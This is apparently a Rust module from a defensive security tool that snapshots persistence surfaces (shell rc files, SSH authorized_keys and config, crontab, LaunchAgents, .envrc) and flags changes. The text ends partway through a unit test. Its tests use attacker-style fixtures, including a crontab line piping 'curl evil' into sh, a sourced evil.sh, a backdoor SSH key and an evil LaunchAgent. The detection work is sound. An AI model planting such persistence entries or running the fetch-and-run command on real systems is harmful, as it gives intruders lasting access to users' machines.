//! Persistence-mechanism inventory + state-change detection (M9 ch2).
//!
//! This module inventories a fixed set of well-known *persistence surfaces* —
//! the files and registries an attacker mutates to survive a reboot or a new
//! shell: shell rc/profile files, `~/.ssh/authorized_keys`, `~/.ssh/config`,
//! `~/.gitconfig`, `~/.npmrc`, the user crontab, systemd-user units, macOS
//! LaunchAgents, login items, `.envrc` in the cwd ancestry, and the git global
//! hooks path. For each surface it records a sha256 + size, and on `diff` it
//! compares the live state against a recorded snapshot to surface *changes*.
//!
//! ## Design
//!
//! The single testable entry point is [`scan_with_root`], which takes the
//! home-directory root and an optional cwd (for the `.envrc` ancestry walk) as
//! parameters. [`scan`] is a thin wrapper that resolves the *real* home dir and
//! cwd and calls it. Tests point [`scan_with_root`] at a `tempfile::tempdir()`
//! and **never** mutate `HOME` / `std::env` — mutating process-global env in
//! tests is a libc data race (see PR #125 history).
//!
//! ## The 6 rules fire on DIFF, not scan
//!
//! `scan` is pure inventory: it never emits a [`crate::verdict::RuleId`]. The
//! six persistence rules are *state-change* rules — they fire from
//! [`diff_against_snapshot`] when a watched surface changed relative to the
//! recorded snapshot. They therefore carry no PATTERN_TABLE entry and live in
//! the `EXTERNALLY_TRIGGERED_RULES` set, following the M8 / M9-ch1
//! runtime-state pattern.
//!
//! ## Shell-outs are timeout-bounded and failure-tolerant
//!
//! `crontab -l` and the macOS login-items `osascript` query run through the
//! shared [`crate::util::run_shell_with_timeout`] helper with a 1.5s budget.
//! A non-zero exit (e.g. crontab's "no crontab for <user>") is treated as
//! **empty**, never as an error — absence of a crontab is the common case.
//!
//! ## Diff shows ADDED LINES ONLY, redacted
//!
//! [`diff_against_snapshot`] reports only lines present in the new content but
//! not the old (never removed lines, never full content), and runs each added
//! line through the shipping credential redactor ([`crate::redact::redact`])
//! before it is surfaced — a new `authorized_keys` entry or a sourced token
//! must never leak verbatim into a finding.

use std::collections::BTreeMap;
use std::path::{Path, PathBuf};
use std::time::Duration;

use serde::{Deserialize, Serialize};

use crate::util::{run_shell_with_timeout, ShellTimeoutOutcome};
use crate::verdict::{RuleId, Severity};

/// Budget for each persistence shell-out (`crontab -l`, login-items
/// `osascript`). Matches the M8 context-detector budget.
const SHELL_OUT_TIMEOUT: Duration = Duration::from_millis(1500);

/// The class of persistence surface a [`PersistenceEntry`] represents. The kind
/// determines which [`RuleId`] a change fires in [`diff_against_snapshot`].
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum PersistenceKind {
    /// A shell rc / profile file (`~/.bashrc`, `~/.zshrc`, `~/.profile`, fish /
    /// PowerShell profiles). A modification fires
    /// [`RuleId::PersistenceShellRcModified`].
    ShellRc,
    /// `~/.ssh/authorized_keys`. An added line fires
    /// [`RuleId::PersistenceAuthorizedKeysNewEntry`].
    AuthorizedKeys,
    /// `~/.ssh/config`. A newly-added `Include` directive fires
    /// [`RuleId::PersistenceSshConfigInclude`].
    SshConfig,
    /// The user crontab (`crontab -l`). A change fires
    /// [`RuleId::PersistenceCrontabModified`].
    Crontab,
    /// A `~/.config/systemd/user/*.service` unit or a
    /// `~/Library/LaunchAgents/*.plist`. A newly-appeared unit fires
    /// [`RuleId::PersistenceLaunchAgentAdded`].
    LaunchAgent,
    /// A `.envrc` in the cwd ancestry (direnv). A newly-appeared file fires
    /// [`RuleId::PersistenceDirenvNewEnvrc`].
    Direnv,
    /// `~/.gitconfig`, `~/.npmrc`, the git global hooks path, login items, and
    /// other surfaces inventoried for change-detection but without a dedicated
    /// rule (a modification is reported generically as a shell-rc-class change
    /// only when it is itself an rc file; these are surfaced in `scan` and
    /// tracked in the snapshot but do NOT fire one of the six rules — they are
    /// inventory-only context).
    Other,
}

impl PersistenceKind {
    pub fn as_str(self) -> &'static str {
        match self {
            PersistenceKind::ShellRc => "shell_rc",
            PersistenceKind::AuthorizedKeys => "authorized_keys",
            PersistenceKind::SshConfig => "ssh_config",
            PersistenceKind::Crontab => "crontab",
            PersistenceKind::LaunchAgent => "launch_agent",
            PersistenceKind::Direnv => "direnv",
            PersistenceKind::Other => "other",
        }
    }
}

/// One inventoried persistence surface: a stable key, its kind, a display
/// location, and the current content fingerprint (`sha256` + `size`).
///
/// `content` carries the raw bytes-as-UTF-8 (lossy) for diffable surfaces so a
/// later `diff` can compute *added lines*. For a surface that does not exist
/// (no crontab, no authorized_keys), `present` is `false`, `sha256` is the hash
/// of the empty string, and `content` is empty — this lets a later
/// appearance/addition be detected as a change from "absent".
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PersistenceEntry {
    /// Stable identifier used as the snapshot map key (e.g. `shell_rc:.zshrc`,
    /// `crontab`, `launch_agent:com.foo.plist`). Stable across runs so the
    /// snapshot diff lines up.
    pub key: String,
    /// The class of surface (drives the rule a change fires).
    pub kind: PersistenceKind,
    /// Human-readable location (a path, or a synthetic label like
    /// `crontab -l` / `login items`).
    pub location: String,
    /// `true` when the surface currently exists / produced output.
    pub present: bool,
    /// Hex sha256 of `content`.
    pub sha256: String,
    /// Byte length of `content`.
    pub size: usize,
    /// Raw content (UTF-8 lossy) used for added-line diffing. Not serialized
    /// into the `scan` JSON output (only the fingerprint is), but IS persisted
    /// in the on-disk snapshot so `diff` can show added lines.
    #[serde(default, skip_serializing_if = "String::is_empty")]
    pub content: String,
}

/// A point-in-time snapshot of every watched persistence surface, keyed by
/// [`PersistenceEntry::key`]. Persisted as JSON at
/// `state_dir()/persistence_snapshot.json`.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct PersistenceSnapshot {
    /// Snapshot schema version (for forward-compatible migrations).
    #[serde(default = "default_schema_version")]
    pub schema_version: u32,
    /// Map of entry key → fingerprint + content.
    #[serde(default)]
    pub entries: BTreeMap<String, SnapshotEntry>,
}

fn default_schema_version() -> u32 {
    1
}

/// The persisted per-surface record: fingerprint + content.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SnapshotEntry {
    pub kind: PersistenceKind,
    pub location: String,
    pub present: bool,
    pub sha256: String,
    pub size: usize,
    #[serde(default)]
    pub content: String,
}

impl PersistenceSnapshot {
    /// Build a snapshot from a freshly-collected inventory.
    pub fn from_entries(entries: &[PersistenceEntry]) -> Self {
        let mut map = BTreeMap::new();
        for e in entries {
            map.insert(
                e.key.clone(),
                SnapshotEntry {
                    kind: e.kind,
                    location: e.location.clone(),
                    present: e.present,
                    sha256: e.sha256.clone(),
                    size: e.size,
                    content: e.content.clone(),
                },
            );
        }
        PersistenceSnapshot {
            schema_version: 1,
            entries: map,
        }
    }
}

/// A single state-change finding emitted by [`diff_against_snapshot`].
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PersistenceFinding {
    /// The rule that fired.
    pub rule_id: RuleId,
    /// Severity (drives the diff/watch exit code).
    pub severity: Severity,
    /// The class of surface that changed.
    pub kind: PersistenceKind,
    /// Human-readable location of the changed surface.
    pub location: String,
    /// Short description of *what* changed (`"added authorized key"`,
    /// `"content modified"`, `"new unit appeared"`).
    pub change: String,
    /// Lines present in the new content but not the snapshot, **already run
    /// through the shipping credential redactor**. Empty for an appearance of a
    /// surface that has no line content (e.g. a new plist tracked by hash).
    pub added_lines: Vec<String>,
}

impl PersistenceFinding {
    /// `true` when this finding is High or Critical (drives diff/watch exit 1).
    pub fn is_high(&self) -> bool {
        matches!(self.severity, Severity::High | Severity::Critical)
    }
}

// ─── inventory (scan) ────────────────────────────────────────────────────────

/// Inventory every watched persistence surface for the real home dir + cwd.
///
/// Resolves `HOME` via the `home` crate and the cwd via
/// [`std::env::current_dir`]. Returns an empty inventory if the home directory
/// cannot be resolved (the `.envrc` ancestry walk still runs against the cwd).
pub fn scan() -> Vec<PersistenceEntry> {
    let home = home::home_dir();
    let cwd = std::env::current_dir().ok();
    match home {
        Some(h) => scan_with_root(&h, cwd.as_deref()),
        None => match cwd {
            Some(c) => collect_envrc_ancestry(&c),
            None => Vec::new(),
        },
    }
}

/// Testable entry point: inventory `home` (a stand-in for `~`) plus an optional
/// `cwd` for the `.envrc` ancestry walk.
///
/// Every surface under `home` is inspected: shell rc/profile files,
/// `~/.ssh/{authorized_keys,config}`, `~/.gitconfig`, `~/.npmrc`, the user
/// crontab (via `crontab -l`), `~/.config/systemd/user/*.service`,
/// `~/Library/LaunchAgents/*.plist`, login items (macOS `osascript`), and the
/// git global hooks path. Tests pass a `tempfile::tempdir()` path here.
pub fn scan_with_root(home: &Path, cwd: Option<&Path>) -> Vec<PersistenceEntry> {
    let mut entries = Vec::new();

    // Shell rc / profile files.
    for rel in SHELL_RC_FILES {
        let path = home.join(rel);
        entries.push(file_entry(
            &format!("shell_rc:{rel}"),
            PersistenceKind::ShellRc,
            &path,
        ));
    }
    // PowerShell profiles live under deeper paths; include the common ones.
    for rel in POWERSHELL_PROFILES {
        let path = home.join(rel);
        if path.is_file() {
            entries.push(file_entry(
                &format!("shell_rc:{rel}"),
                PersistenceKind::ShellRc,
                &path,
            ));
        }
    }

    // SSH authorized_keys + config.
    entries.push(file_entry(
        "authorized_keys",
        PersistenceKind::AuthorizedKeys,
        &home.join(".ssh").join("authorized_keys"),
    ));
    entries.push(file_entry(
        "ssh_config",
        PersistenceKind::SshConfig,
        &home.join(".ssh").join("config"),
    ));

    // Inventory-only context surfaces (tracked for change-detection, no
    // dedicated rule): gitconfig, npmrc.
    entries.push(file_entry(
        "other:.gitconfig",
        PersistenceKind::Other,
        &home.join(".gitconfig"),
    ));
    entries.push(file_entry(
        "other:.npmrc",
        PersistenceKind::Other,
        &home.join(".npmrc"),
    ));

    // Crontab (shell-out, timeout-bounded, absence == empty).
    entries.push(crontab_entry());

    // systemd-user units.
    entries.extend(launch_agent_dir(
        &home.join(".config").join("systemd").join("user"),
        "service",
    ));
    // macOS LaunchAgents.
    entries.extend(launch_agent_dir(
        &home.join("Library").join("LaunchAgents"),
        "plist",
    ));

    // Login items (macOS osascript). On non-macOS this produces an absent
    // entry (the binary is not found / produces no output).
    entries.push(login_items_entry());

    // git global hooks path (core.hooksPath), inventory-only.
    if let Some(e) = git_hooks_path_entry(home) {
        entries.push(e);
    }

    // `.envrc` in the cwd ancestry.
    if let Some(c) = cwd {
        entries.extend(collect_envrc_ancestry(c));
    }

    entries
}

/// Shell rc / profile files inspected under `~`.
const SHELL_RC_FILES: &[&str] = &[
    ".bashrc",
    ".bash_profile",
    ".zshrc",
    ".zprofile",
    ".profile",
    ".config/fish/config.fish",
];

/// PowerShell profile paths (only added when present — these vary by host).
const POWERSHELL_PROFILES: &[&str] = &[
    ".config/powershell/Microsoft.PowerShell_profile.ps1",
    "Documents/PowerShell/Microsoft.PowerShell_profile.ps1",
    "Documents/WindowsPowerShell/Microsoft.PowerShell_profile.ps1",
];

/// Build a [`PersistenceEntry`] for a single file path. A missing / unreadable
/// file yields an `absent` entry (hash of the empty string) so a later
/// appearance is a detectable change.
fn file_entry(key: &str, kind: PersistenceKind, path: &Path) -> PersistenceEntry {
    let (present, content) = match read_text_if_file(path) {
        Some(c) => (true, c),
        None => (false, String::new()),
    };
    PersistenceEntry {
        key: key.to_string(),
        kind,
        location: path.display().to_string(),
        present,
        sha256: sha256_hex(content.as_bytes()),
        size: content.len(),
        content,
    }
}

/// Inventory the user crontab via `crontab -l`. A non-zero exit (the common
/// "no crontab for <user>" case) is treated as an EMPTY crontab, NOT an error.
fn crontab_entry() -> PersistenceEntry {
    let content = match run_shell_with_timeout(
        "crontab",
        &["-l"],
        SHELL_OUT_TIMEOUT,
        Duration::from_millis(25),
        std::process::Stdio::null(),
    ) {
        ShellTimeoutOutcome::Completed { status, stdout } if status.success() => {
            String::from_utf8_lossy(&stdout).into_owned()
        }
        // Non-zero exit ("no crontab"), NotFound, timeout, or spawn error →
        // treat as an empty crontab. Absence is the common case, never an error.
        _ => String::new(),
    };
    let present = !content.trim().is_empty();
    PersistenceEntry {
        key: "crontab".to_string(),
        kind: PersistenceKind::Crontab,
        location: "crontab -l".to_string(),
        present,
        sha256: sha256_hex(content.as_bytes()),
        size: content.len(),
        content,
    }
}

/// Inventory each unit file in a launch-agent / systemd-user directory. Each
/// matching file (by `ext`) becomes its own entry keyed by filename so an
/// added unit is detected as a newly-appearing key. The raw file is HASHED for
/// change-detection (we do not parse plists — a content hash is sufficient and
/// avoids a `plutil` shell-out per file).
fn launch_agent_dir(dir: &Path, ext: &str) -> Vec<PersistenceEntry> {
    let mut entries = Vec::new();
    let read = match std::fs::read_dir(dir) {
        Ok(r) => r,
        Err(_) => return entries,
    };
    for entry in read.flatten() {
        let path = entry.path();
        if !path.is_file() {
            continue;
        }
        let name = match path.file_name().and_then(|n| n.to_str()) {
            Some(n) => n.to_string(),
            None => continue,
        };
        if !name.to_ascii_lowercase().ends_with(&format!(".{ext}")) {
            continue;
        }
        // Read raw bytes (plists may be binary); hash for change-detection.
        let bytes = std::fs::read(&path).unwrap_or_default();
        // Keep a UTF-8-lossy copy for added-line diffing of XML plists /
        // systemd units (binary plists simply won't yield meaningful lines).
        let content = String::from_utf8_lossy(&bytes).into_owned();
        entries.push(PersistenceEntry {
            key: format!("launch_agent:{name}"),
            kind: PersistenceKind::LaunchAgent,
            location: path.display().to_string(),
            present: true,
            sha256: sha256_hex(&bytes),
            size: bytes.len(),
            content,
        });
    }
    entries
}

/// Inventory macOS login items via `osascript`. On non-macOS (or when
/// `osascript` is absent / errors / times out) this yields an `absent`
/// inventory-only entry.
fn login_items_entry() -> PersistenceEntry {
    let content = match run_shell_with_timeout(
        "osascript",
        &[
            "-e",
            "tell application \"System Events\" to get the name of every login item",
        ],
        SHELL_OUT_TIMEOUT,
        Duration::from_millis(25),
        std::process::Stdio::null(),
    ) {
        ShellTimeoutOutcome::Completed { status, stdout } if status.success() => {
            String::from_utf8_lossy(&stdout).into_owned()
        }
        _ => String::new(),
    };
    let present = !content.trim().is_empty();
    PersistenceEntry {
        key: "login_items".to_string(),
        kind: PersistenceKind::Other,
        location: "login items".to_string(),
        present,
        sha256: sha256_hex(content.as_bytes()),
        size: content.len(),
        content,
    }
}

/// Inventory the git global hooks path (`core.hooksPath`) if `~/.gitconfig`
/// sets one. Inventory-only (no dedicated rule); a change is surfaced in
/// `scan`. Returns `None` when no hooks path is configured.
fn git_hooks_path_entry(home: &Path) -> Option<PersistenceEntry> {
    let gitconfig = read_text_if_file(&home.join(".gitconfig"))?;
    let hooks_path = parse_git_hooks_path(&gitconfig)?;
    Some(PersistenceEntry {
        key: "git_hooks_path".to_string(),
        kind: PersistenceKind::Other,
        location: format!("git core.hooksPath = {hooks_path}"),
        present: true,
        sha256: sha256_hex(hooks_path.as_bytes()),
        size: hooks_path.len(),
        content: hooks_path,
    })
}

/// Extract `core.hooksPath` from a gitconfig body. Handles both the
/// `[core]` section `hooksPath = …` form and the one-line dotted
/// `core.hooksPath = …` form.
fn parse_git_hooks_path(contents: &str) -> Option<String> {
    let mut in_core = false;
    for raw in contents.lines() {
        let line = raw.trim();
        if line.is_empty() || line.starts_with('#') || line.starts_with(';') {
            continue;
        }
        if line.starts_with('[') {
            let header = line.trim_start_matches('[').trim_end_matches(']');
            let section = header
                .split_whitespace()
                .next()
                .unwrap_or("")
                .to_ascii_lowercase();
            in_core = section == "core";
            continue;
        }
        if let Some((key, value)) = line.split_once('=') {
            let key_lc = key.trim().to_ascii_lowercase();
            let value = value.trim().trim_matches('"').trim_matches('\'').trim();
            if value.is_empty() {
                continue;
            }
            if key_lc == "core.hookspath" || (in_core && key_lc == "hookspath") {
                return Some(value.to_string());
            }
        }
    }
    None
}

/// Walk from `cwd` up to the filesystem root collecting every `.envrc` found.
/// Each `.envrc` is its own entry keyed by its absolute path so a newly-created
/// one in the ancestry is a detectable appearance.
fn collect_envrc_ancestry(cwd: &Path) -> Vec<PersistenceEntry> {
    let mut entries = Vec::new();
    let mut cur = Some(cwd);
    // Bound the walk to avoid pathological symlink loops.
    let mut budget: usize = 256;
    while let Some(dir) = cur {
        if budget == 0 {
            break;
        }
        budget -= 1;
        let envrc = dir.join(".envrc");
        if envrc.is_file() {
            if let Some(content) = read_text_if_file(&envrc) {
                entries.push(PersistenceEntry {
                    key: format!("direnv:{}", envrc.display()),
                    kind: PersistenceKind::Direnv,
                    location: envrc.display().to_string(),
                    present: true,
                    sha256: sha256_hex(content.as_bytes()),
                    size: content.len(),
                    content,
                });
            }
        }
        cur = dir.parent();
    }
    entries
}

// ─── diff (state-change detection) ─────────────────────────────────────────────

/// Compare the live inventory under `home` / `cwd` against `snapshot` and emit
/// a [`PersistenceFinding`] for every watched surface that changed.
///
/// Added lines are computed (new content minus snapshot content) and run
/// through the shipping credential redactor before being attached to the
/// finding. Only added lines are reported — never removed lines, never full
/// content.
pub fn diff_against_snapshot(
    home: &Path,
    cwd: Option<&Path>,
    snapshot: &PersistenceSnapshot,
) -> Vec<PersistenceFinding> {
    let current = scan_with_root(home, cwd);
    diff_entries(&current, snapshot)
}

/// Core diff used by both [`diff_against_snapshot`] and the CLI: compare a
/// freshly-collected `current` inventory against `snapshot`.
pub fn diff_entries(
    current: &[PersistenceEntry],
    snapshot: &PersistenceSnapshot,
) -> Vec<PersistenceFinding> {
    let mut findings = Vec::new();

    for entry in current {
        let prev = snapshot.entries.get(&entry.key);

        // Determine whether this surface changed.
        let (changed, prev_content, prev_present) = match prev {
            Some(p) => (p.sha256 != entry.sha256, p.content.as_str(), p.present),
            // No snapshot record for this key. A NEWLY-APPEARING surface that
            // is present now is a change worth reporting (a brand-new
            // LaunchAgent / .envrc). An absent surface with no prior record is
            // not a change (first-ever scan of an empty surface).
            None => (entry.present, "", false),
        };

        if !changed {
            continue;
        }

        // Map the surface kind onto its rule + severity. Inventory-only
        // surfaces (`Other`) never fire a rule.
        let (rule_id, severity) = match entry.kind {
            PersistenceKind::ShellRc => (RuleId::PersistenceShellRcModified, Severity::Medium),
            PersistenceKind::AuthorizedKeys => {
                (RuleId::PersistenceAuthorizedKeysNewEntry, Severity::High)
            }
            PersistenceKind::Crontab => (RuleId::PersistenceCrontabModified, Severity::Medium),
            PersistenceKind::LaunchAgent => (RuleId::PersistenceLaunchAgentAdded, Severity::High),
            PersistenceKind::SshConfig => {
                // Only fire when the change ADDS an `Include` directive — a
                // benign `Host` edit should not trip the persistence rule.
                if !added_includes(prev_content, &entry.content) {
                    continue;
                }
                (RuleId::PersistenceSshConfigInclude, Severity::Medium)
            }
            PersistenceKind::Direnv => (RuleId::PersistenceDirenvNewEnvrc, Severity::Medium),
            PersistenceKind::Other => continue,
        };

        let added = added_lines_redacted(prev_content, &entry.content);
        let change = describe_change(entry.kind, prev_present, entry.present);

        findings.push(PersistenceFinding {
            rule_id,
            severity,
            kind: entry.kind,
            location: entry.location.clone(),
            change,
            added_lines: added,
        });
    }

    findings
}

/// One-line human description of the change for a surface kind.
fn describe_change(kind: PersistenceKind, prev_present: bool, now_present: bool) -> String {
    match (kind, prev_present, now_present) {
        (PersistenceKind::AuthorizedKeys, _, _) => "authorized key(s) added".to_string(),
        (PersistenceKind::LaunchAgent, false, true) => "new unit appeared".to_string(),
        (PersistenceKind::LaunchAgent, true, true) => "unit modified".to_string(),
        (PersistenceKind::Direnv, false, true) => "new .envrc appeared".to_string(),
        (PersistenceKind::SshConfig, _, _) => "Include directive added".to_string(),
        (PersistenceKind::Crontab, false, true) => "crontab created".to_string(),
        (PersistenceKind::Crontab, _, _) => "crontab modified".to_string(),
        (_, false, true) => "file created".to_string(),
        (_, true, false) => "file removed".to_string(),
        _ => "content modified".to_string(),
    }
}

/// Lines present in `new` but not in `old`, run through the shipping credential
/// redactor. Order-preserving, deduplicated against the set of old lines.
fn added_lines_redacted(old: &str, new: &str) -> Vec<String> {
    use std::collections::HashSet;
    let old_set: HashSet<&str> = old.lines().collect();
    let mut out = Vec::new();
    for line in new.lines() {
        if old_set.contains(line) {
            continue;
        }
        if line.trim().is_empty() {
            continue;
        }
        out.push(crate::redact::redact(line));
    }
    out
}

/// `true` when `new` contains an `Include` directive line that `old` did not.
/// Used to gate the SSH-config rule on an *added* include specifically.
fn added_includes(old: &str, new: &str) -> bool {
    use std::collections::HashSet;
    let old_includes: HashSet<String> = include_lines(old).collect();
    include_lines(new).any(|l| !old_includes.contains(&l))
}

/// Iterator over normalized `Include`/`IncludeIf`-style directive lines in an
/// SSH config body (case-insensitive keyword match, trimmed).
fn include_lines(contents: &str) -> impl Iterator<Item = String> + '_ {
    contents.lines().filter_map(|raw| {
        let line = raw.trim();
        if line.is_empty() || line.starts_with('#') {
            return None;
        }
        let keyword = line.split(char::is_whitespace).next().unwrap_or("");
        if keyword.eq_ignore_ascii_case("include") {
            Some(line.to_string())
        } else {
            None
        }
    })
}

// ─── shared helpers ────────────────────────────────────────────────────────────

/// Hex sha256 of a byte slice.
fn sha256_hex(bytes: &[u8]) -> String {
    use sha2::{Digest, Sha256};
    let digest = Sha256::digest(bytes);
    let mut s = String::with_capacity(64);
    for b in digest {
        use std::fmt::Write as _;
        let _ = write!(s, "{b:02x}");
    }
    s
}

/// Read a path as UTF-8 text only when it is a regular file. Returns `None` for
/// directories, missing files, permission errors, or non-UTF-8 content.
fn read_text_if_file(path: &Path) -> Option<String> {
    if !path.is_file() {
        return None;
    }
    std::fs::read_to_string(path).ok()
}

/// Default on-disk snapshot path: `state_dir()/persistence_snapshot.json`.
pub fn snapshot_path() -> Option<PathBuf> {
    crate::policy::state_dir().map(|d| d.join("persistence_snapshot.json"))
}

/// Load a snapshot from `path`. Returns an empty (default) snapshot when the
/// file is absent or unparseable — a missing snapshot means "no baseline yet",
/// not an error.
pub fn load_snapshot(path: &Path) -> PersistenceSnapshot {
    match std::fs::read_to_string(path) {
        Ok(s) => serde_json::from_str(&s).unwrap_or_default(),
        Err(_) => PersistenceSnapshot::default(),
    }
}

/// Persist `snapshot` to `path`, creating the parent directory if needed.
pub fn save_snapshot(path: &Path, snapshot: &PersistenceSnapshot) -> std::io::Result<()> {
    if let Some(parent) = path.parent() {
        std::fs::create_dir_all(parent)?;
    }
    let json = serde_json::to_string_pretty(snapshot)
        .map_err(|e| std::io::Error::new(std::io::ErrorKind::InvalidData, e))?;
    std::fs::write(path, json)
}

#[cfg(test)]
mod tests {
    use super::*;
    use tempfile::tempdir;

    fn rule_ids(findings: &[PersistenceFinding]) -> Vec<RuleId> {
        findings.iter().map(|f| f.rule_id).collect()
    }

    /// Snapshot the current inventory, mutate the tree, then diff.
    fn snapshot_then(home: &Path, cwd: Option<&Path>) -> PersistenceSnapshot {
        let entries = scan_with_root(home, cwd);
        PersistenceSnapshot::from_entries(&entries)
    }

    #[test]
    fn scan_reports_sha256_for_existing_rc() {
        let home = tempdir().unwrap();
        std::fs::write(
            home.path().join(".zshrc"),
            b"export PATH=$PATH:/usr/local/bin\n",
        )
        .unwrap();

        let entries = scan_with_root(home.path(), None);
        let zshrc = entries
            .iter()
            .find(|e| e.key == "shell_rc:.zshrc")
            .expect("expected .zshrc entry");
        assert!(zshrc.present);
        assert_eq!(zshrc.sha256.len(), 64);
        assert_ne!(zshrc.sha256, sha256_hex(b""));
    }

    #[test]
    fn shell_rc_modified_fires_medium() {
        let home = tempdir().unwrap();
        let zshrc = home.path().join(".zshrc");
        std::fs::write(&zshrc, b"export PATH=$PATH:/usr/local/bin\n").unwrap();

        let snap = snapshot_then(home.path(), None);

        // Modify the rc file: append a sourced payload.
        std::fs::write(
            &zshrc,
            b"export PATH=$PATH:/usr/local/bin\nsource ~/.cache/evil.sh\n",
        )
        .unwrap();

        let findings = diff_against_snapshot(home.path(), None, &snap);
        let f = findings
            .iter()
            .find(|f| f.rule_id == RuleId::PersistenceShellRcModified)
            .expect("expected shell-rc-modified finding");
        assert_eq!(f.severity, Severity::Medium);
        assert!(
            f.added_lines.iter().any(|l| l.contains("evil.sh")),
            "added lines should include the new source line, got {:?}",
            f.added_lines
        );
    }

    #[test]
    fn unchanged_rc_does_not_fire() {
        let home = tempdir().unwrap();
        std::fs::write(home.path().join(".bashrc"), b"alias ll='ls -la'\n").unwrap();

        let snap = snapshot_then(home.path(), None);
        // No mutation.
        let findings = diff_against_snapshot(home.path(), None, &snap);
        assert!(
            findings.is_empty(),
            "no change → no findings, got {findings:?}"
        );
    }

    #[test]
    fn authorized_keys_new_entry_fires_high() {
        let home = tempdir().unwrap();
        let ssh = home.path().join(".ssh");
        std::fs::create_dir_all(&ssh).unwrap();
        let ak = ssh.join("authorized_keys");
        std::fs::write(&ak, b"ssh-ed25519 AAAAExistingKey user@host\n").unwrap();

        let snap = snapshot_then(home.path(), None);

        // Append an attacker key.
        std::fs::write(
            &ak,
            b"ssh-ed25519 AAAAExistingKey user@host\nssh-rsa AAAABackdoorKey attacker@evil\n",
        )
        .unwrap();

        let findings = diff_against_snapshot(home.path(), None, &snap);
        let f = findings
            .iter()
            .find(|f| f.rule_id == RuleId::PersistenceAuthorizedKeysNewEntry)
            .expect("expected authorized_keys finding");
        assert!(f.is_high());
        assert!(f.added_lines.iter().any(|l| l.contains("AAAABackdoorKey")));
        // The pre-existing key must NOT be reported as added.
        assert!(!f.added_lines.iter().any(|l| l.contains("AAAAExistingKey")));
    }

    #[test]
    fn crontab_modified_fires_medium_via_entries() {
        // Crontab content comes from a shell-out we can't drive in a unit
        // test; exercise the diff logic directly with synthesized entries.
        let old = vec![PersistenceEntry {
            key: "crontab".to_string(),
            kind: PersistenceKind::Crontab,
            location: "crontab -l".to_string(),
            present: true,
            sha256: sha256_hex(b"0 * * * * backup.sh\n"),
            size: 20,
            content: "0 * * * * backup.sh\n".to_string(),
        }];
        let snap = PersistenceSnapshot::from_entries(&old);

        let new = vec![PersistenceEntry {
            key: "crontab".to_string(),
            kind: PersistenceKind::Crontab,
            location: "crontab -l".to_string(),
            present: true,
            content: "0 * * * * backup.sh\n* * * * * curl evil|sh\n".to_string(),
            sha256: sha256_hex(b"0 * * * * backup.sh\n* * * * * curl evil|sh\n"),
            size: 44,
        }];

        let findings = diff_entries(&new, &snap);
        let f = findings
            .iter()
            .find(|f| f.rule_id == RuleId::PersistenceCrontabModified)
            .expect("expected crontab-modified finding");
        assert_eq!(f.severity, Severity::Medium);
        assert!(f.added_lines.iter().any(|l| l.contains("curl evil")));
    }

    #[test]
    fn launch_agent_added_fires_high() {
        let home = tempdir().unwrap();
        // Snapshot with NO launch agents.
        let snap = snapshot_then(home.path(), None);

        // Add a LaunchAgent plist.
        let la = home.path().join("Library").join("LaunchAgents");
        std::fs::create_dir_all(&la).unwrap();
        std::fs::write(
            la.join("com.evil.persist.plist"),
            b"<?xml version=\"1.0\"?>\n<plist><dict><key>Label</key><string>com.evil.persist</string></dict></plist>\n",
        )
        .unwrap();

        let findings = diff_against_snapshot(home.path(), None, &snap);
        let f = findings
            .iter()
            .find(|f| f.rule_id == RuleId::PersistenceLaunchAgentAdded)
            .expect("expected launch-agent-added finding");
        assert!(f.is_high());
        assert_eq!(f.change, "new unit appeared");
    }

    #[test]
    fn ssh_config_include_added_fires_medium() {
        let home = tempdir().unwrap();
        let ssh = home.path().join(".ssh");
        std::fs::create_dir_all(&ssh).unwrap();
        let cfg = ssh.join("config");
        std::fs::write(&cfg, b"Host *\n  ServerAliveInterval 60\n").unwrap();

        let snap = snapshot_then(home.path(), None);

        // Add an Include directive.
        std::fs::write(
            &cfg,
            b"Host *\n  ServerAliveInterval 60\nInclude /tmp/attacker_config\n",
        )
        .unwrap();

        let findings = diff_against_snapshot(home.path(), None, &snap);
        let f = findings
            .iter()
            .find(|f| f.rule_id == RuleId::PersistenceSshConfigInclude)
            .expect("expected ssh-config-include finding");
        assert_eq!(f.severity, Severity::Medium);
        assert!(f.added_lines.iter().any(|l| l.contains("Include")));
    }

    #[test]
    fn ssh_config_non_include_edit_does_not_fire() {
        let home = tempdir().unwrap();
        let ssh = home.path().join(".ssh");
        std::fs::create_dir_all(&ssh).unwrap();
        let cfg = ssh.join("config");
        std::fs::write(&cfg, b"Host *\n  ServerAliveInterval 60\n").unwrap();

        let snap = snapshot_then(home.path(), None);

        // Change an unrelated option — must NOT fire the Include rule.
        std::fs::write(&cfg, b"Host *\n  ServerAliveInterval 120\n").unwrap();

        let findings = diff_against_snapshot(home.path(), None, &snap);
        assert!(
            !rule_ids(&findings).contains(&RuleId::PersistenceSshConfigInclude),
            "a non-Include edit must not fire the SSH-config rule, got {findings:?}"
        );
    }

    #[test]
    fn direnv_new_envrc_fires_medium() {
        let home = tempdir().unwrap();
        let project = tempdir().unwrap();
        // Snapshot with no .envrc in the project.
        let snap = snapshot_then(home.path(), Some(project.path()));

        // Create a new .envrc.
        std::fs::write(
            project.path().join(".envrc"),
            b"export AWS_PROFILE=prod\nexport SECRET=abc\n",
        )
        .unwrap();

        let findings = diff_against_snapshot(home.path(), Some(project.path()), &snap);
        let f = findings
            .iter()
            .find(|f| f.rule_id == RuleId::PersistenceDirenvNewEnvrc)
            .expect("expected direnv finding");
        assert_eq!(f.severity, Severity::Medium);
        assert_eq!(f.change, "new .envrc appeared");
    }

    #[test]
    fn added_lines_are_credential_redacted() {
        // A sourced AWS key in an rc diff must be redacted in added_lines.
        let old = "export PATH=/usr/bin\n";
        let new = "export PATH=/usr/bin\nexport AWS_KEY=AKIAIOSFODNN7EXAMPLE\n";
        let added = added_lines_redacted(old, new);
        assert_eq!(added.len(), 1);
        assert!(
            !added[0].contains("AKIAIOSFODNN7EXAMPLE"),
            "credential must be redacted, got {:?}",
            added
        );
        assert!(added[0].contains("[REDACTED"));
    }

    #[test]
    fn crontab_absence_is_empty_not_present() {
        // A crontab shell-out that fails ("no crontab") yields an absent,
        // empty entry — and diffing two absent crontabs yields no finding.
        let entry = crontab_entry();
        // On CI there is usually no crontab; either way the entry must be
        // well-formed (64-char hash, content/size consistent).
